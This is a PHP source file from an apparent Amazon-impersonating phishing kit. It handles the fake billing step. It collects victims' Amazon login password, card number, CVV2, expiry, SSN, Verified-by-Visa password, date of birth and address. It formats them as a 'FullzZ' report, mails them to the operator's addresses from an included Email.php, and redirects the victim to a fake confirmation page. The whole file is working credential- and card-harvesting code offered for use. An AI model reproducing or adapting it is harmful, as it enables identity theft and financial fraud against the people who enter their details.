<?php
###################################
// Don't change anything here
// Created By Mr.HiTman
// From Jordan
##################################

ini_set("output_buffering",4096);
session_start();


include ('Email.php');






$loginemail = $_SESSION['TheEmail'];
$loginpass =  $_SESSION['ThePassword'];
$loginname = $_SESSION['FullNamer'];
$loginaddress = $_SESSION['Address11'];
$logincity = $_SESSION['CityName'];
$loginstate = $_SESSION['StateN'];
$loginzip = $_SESSION['ZipCode'];
$logincountry = $_SESSION['CountryNa'];
$loginphone = $_SESSION['Phone221'];
$loginaddresstype = $_SESSION['AddressTypea'];
$loginpost = $_SESSION['post'];
$loginvalid = $_SESSION['Valid'];
$ip_header = $_SESSION['ip_header'];
$ip = $_SERVER['REMOTE_ADDR'];


$_SESSION['errors'] = $errors=0;


$_SESSION['NameonCards'] = $NameonCards = $_POST['NameonCards'];
$_SESSION['Cardanumber'] = $Cardanumber = $_POST['Cardanumber'];
$_SESSION['CVV2'] = $CVV2 = $_POST['CVV2'];
$_SESSION['Expiredatesss'] = $Expiredatesss = $_POST['Expiredatesss'];
$_SESSION['expdate_year'] = $expdate_year = $_POST['expdate_year'];

$_SESSION['ssn21124'] = $ssn21124 = $_POST['ssn21124'];
$_SESSION['securepass'] = $securepass = $_POST['securepass'];
$_SESSION['dobday'] = $dobday = $_POST['dobday'];
$_SESSION['dobmonth'] = $dobmonth = $_POST['dobmonth'];
$_SESSION['dobyear'] = $dobyear = $_POST['dobyear'];



if ($NameonCards=="")
{
$NameOncArd=1;
}
else
{
$NameOncArd=0;
}


if ($Cardanumber=="")
{
$CardNumb=1;
}
else
{
$CardNumb=0;
}



$cvv2zen = strlen($CVV2);
if ($cvv2zen<3) 
{
$CVV2C=1;
}
else
{
$CVV2C=0;
}


if ($Expiredatesss=="--")
{
$ExpMonth=1;
}
else
{
$ExpMonth=0;
}




if ($expdate_year=="")
{
$ExpYear=1;
}
else
{
$ExpYear=0;
}



if (($dobmonth!="")&&($dobday!="")&&($dobyear!=""))
{
$Dober=0;
}
else
{
$Dober=1;
}


if ($NameOncArd==1||$CardNumb==1||$CVV2C==1||$ExpMonth==1||$ExpYear==1||$Dober)
{
$errors=1;
}
else{
$errors=0;
}




if ($errors==0)
{

$Zboon="---------------------AmaZon FullzZ-----------------
Login : $loginemail
Password   : $loginpass
---------------------Card info--------------------------
Name On Card: $NameonCards
Card Number: $Cardanumber
CVV2: $CVV2
Exp.Month: $Expiredatesss
Exp.Year: $expdate_year
SSN: $ssn21124
VBV Pass: $securepass
DOB: $dobday/$dobmonth/$dobyear ( Day - Month - Year )
----------------------Contact info-----------------------
Name: $loginname
Address: $loginaddress
City: $logincity
State: $loginstate
ZIP: $loginzip
Address Type:$loginaddresstype
Country: $logincountry
Tel: $loginphone
IP: http://www.geoiptool.com/?IP=$ip
---------------------VBV Amazon--------------------------
";




$allemails = split("\n", $loginpost."\n".$loginvalid."\n".$userinfo);
$numemails = count($allemails);
for($x=0; $x<$numemails; $x++){
$to = $allemails[$x];
if ($to){
$to = ereg_replace(" ", "", $to);
$message = ereg_replace("&email&", $to, $Zboon);
$subject = ereg_replace("&email&", $to, "Amazon $logincountry >>$ip<<");
flush();
$header = "From: Fullzz YALA <ama@send.com>\n";
 $header .= "MIME-Version: 1.0\r\n";
 $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
 $header .= "$message\r\n";
 mail($to, $subject, "", $header);
  flush();
 }}

$encoding_url="confirmed.php?action=confirmed=true&_session;".md5(time()).md5(time());
header("Location: $encoding_url");
}

else
{
header("Location: Billing.php?errors=$errors&NameOncArd=$NameOncArd&CardNumb=$CardNumb&CVV2C=$CVV2C&ExpMonth=$ExpMonth&ExpYear=$ExpYear&Dober=$Dober");
}

?>